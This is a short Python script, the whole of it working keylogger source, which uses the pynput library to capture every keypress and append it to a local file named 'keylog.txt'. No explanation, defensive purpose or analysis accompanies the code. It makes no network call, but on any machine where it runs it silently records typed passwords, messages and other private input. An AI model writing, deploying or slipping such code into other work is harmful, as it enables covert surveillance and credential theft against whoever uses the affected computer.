from pynput.keyboard import Listener
import logging

# Create a logger
logger = logging.getLogger('keylogger')
logger.setLevel(logging.DEBUG)

# Create a file handler
handler = logging.FileHandler('keylog.txt')
handler.setLevel(logging.DEBUG)

# Create a formatter
formatter = logging.Formatter('%(message)s')
handler.setFormatter(formatter)

# Add the handler to the logger
logger.addHandler(handler)

def on_press(key):
    logger.debug(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()